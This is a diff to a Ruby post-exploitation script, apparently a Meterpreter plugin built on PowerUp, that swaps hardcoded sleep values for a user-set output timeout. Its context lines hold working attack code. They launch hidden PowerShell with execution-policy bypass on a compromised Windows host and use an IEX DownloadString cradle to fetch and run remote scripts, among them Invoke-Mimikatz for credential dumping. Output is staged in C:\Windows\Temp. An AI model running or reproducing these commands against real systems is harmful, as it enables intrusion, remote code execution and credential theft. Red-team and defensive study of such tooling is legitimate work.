@@ -168,6 +168,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
       when '-t'
         begin
           c_time = Integer(val)
+          print_warning("Output timeout: #{val} seconds")
         rescue
           print_error "#{val} is not a valid Integer."
         end
@@ -184,7 +185,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
     ps_cmd  = args.join(" ")
     client.sys.process.execute("powershell -nop -exec bypass -c #{ps_cmd} >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
     print_status("Sending command to client...")
-    sleep(10)
+    sleep(c_time)
     log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
     begin
       while ((data = log_file.read) != nil)
@@ -210,6 +211,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
       when '-t'
         begin
           c_time = Integer(val)
+          print_warning("Output timeout: #{val} seconds")
         rescue
           print_error "#{val} is not a valid Integer."
         end
@@ -227,7 +229,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
     ps_cmd  = args.join(" ")
     client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
     print_status("Sending command to client...")
-    sleep(10)
+    sleep(c_time)
     log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
     begin
       while ((data = log_file.read) != nil)
@@ -253,6 +255,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
       when '-t'
         begin
           c_time = Integer(val)
+          print_warning("Output timeout: #{val} seconds")
         rescue
           print_error "#{val} is not a valid Integer."
         end
@@ -270,7 +273,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
     ps_cmd  = args.join(" ")
     client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
     print_status("Sending command to client...")
-    sleep(10)
+    sleep(c_time)
     log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
     begin
       while ((data = log_file.read) != nil)
@@ -296,6 +299,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
       when '-t'
         begin
           c_time = Integer(val)
+          print_warning("Output timeout: #{val} seconds")
         rescue
           print_error "#{val} is not a valid Integer."
         end
@@ -314,7 +318,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
     client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
     print_status("Sending command to client...")
     print_warning("This could take a bit...")
-    sleep(11)
+    sleep(c_time)
     log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
     begin
       while ((data = log_file.read) != nil)
